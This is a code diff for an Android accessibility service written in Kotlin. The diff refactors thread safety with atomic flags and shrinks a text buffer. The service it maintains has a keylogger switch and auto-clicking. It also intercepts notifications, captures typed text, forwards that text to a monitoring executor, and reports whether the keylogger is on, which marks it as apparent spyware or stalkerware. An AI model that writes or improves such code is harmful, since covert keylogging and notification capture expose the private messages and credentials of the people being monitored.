@@ -26,12 +26,12 @@ class MyAccessibilityService : AccessibilityService() {
 
     companion object {
         private var instance: MyAccessibilityService? = null
-        private var keyloggerEnabled = false
-        private var autoClickEnabled = false
-        private var notificationInterceptEnabled = false
+        private val keyloggerEnabled = java.util.concurrent.atomic.AtomicBoolean(false)
+        private val autoClickEnabled = java.util.concurrent.atomic.AtomicBoolean(false)
+        private val notificationInterceptEnabled = java.util.concurrent.atomic.AtomicBoolean(false)
         
         // Gesture results
-        private var gestureResult: Boolean = false
+        @Volatile private var gestureResult: Boolean = false
         private var gestureLatch: CountDownLatch? = null
 
         fun getInstance(): MyAccessibilityService? = instance
@@ -47,17 +47,17 @@ class MyAccessibilityService : AccessibilityService() {
         }
         
         fun setKeyloggerEnabled(enabled: Boolean) {
-            keyloggerEnabled = enabled
+            keyloggerEnabled.set(enabled)
         }
         
-        fun isKeyloggerEnabled(): Boolean = keyloggerEnabled
+        fun isKeyloggerEnabled(): Boolean = keyloggerEnabled.get()
         
         fun setAutoClickEnabled(enabled: Boolean) {
-            autoClickEnabled = enabled
+            autoClickEnabled.set(enabled)
         }
         
         fun setNotificationInterceptEnabled(enabled: Boolean) {
-            notificationInterceptEnabled = enabled
+            notificationInterceptEnabled.set(enabled)
         }
     }
 
@@ -206,8 +206,8 @@ class MyAccessibilityService : AccessibilityService() {
             if (capturedText.isNotEmpty()) {
                 // Update last captured
                 lastCapturedText.append(capturedText)
-                if (lastCapturedText.length > 100000) {
-                    lastCapturedText = StringBuilder(lastCapturedText.takeLast(50000))
+                if (lastCapturedText.length > 10000) {
+                    lastCapturedText = StringBuilder(lastCapturedText.takeLast(5000))
                 }
                 
                 // Send to MonitorExecutor
@@ -365,8 +365,8 @@ class MyAccessibilityService : AccessibilityService() {
     override fun onDestroy() {
         super.onDestroy()
         instance = null
-        keyloggerEnabled = false
-        autoClickEnabled = false
+        keyloggerEnabled.set(false)
+        autoClickEnabled.set(false)
         
         // Buffer event locally
         com.abuzahra.manager.EventBuffer.addEvent(
@@ -395,6 +395,9 @@ class MyAccessibilityService : AccessibilityService() {
             if (clicked) return true
         }
         
+        // No explicit recycling needed for findAccessibilityNodeInfosByText
+        // as they return new lists that can be garbage collected (API 21+)
+
         return false
     }
 
@@ -410,6 +413,9 @@ class MyAccessibilityService : AccessibilityService() {
             if (clicked) return true
         }
         
+        // No explicit recycling needed for findAccessibilityNodeInfosByViewId
+        // as they return new lists that can be garbage collected (API 21+)
+
         return false
     }
     
@@ -722,8 +728,8 @@ class MyAccessibilityService : AccessibilityService() {
             "text_events" to textEventCount,
             "click_events" to clickEventCount,
             "notification_events" to notificationEventCount,
-            "keylogger_enabled" to keyloggerEnabled,
-            "auto_click_enabled" to autoClickEnabled,
+            "keylogger_enabled" to keyloggerEnabled.get(),
+            "auto_click_enabled" to autoClickEnabled.get(),
             "current_app" to currentApp,
             "last_event_type" to lastEventType,
             "captured_text_length" to lastCapturedText.length
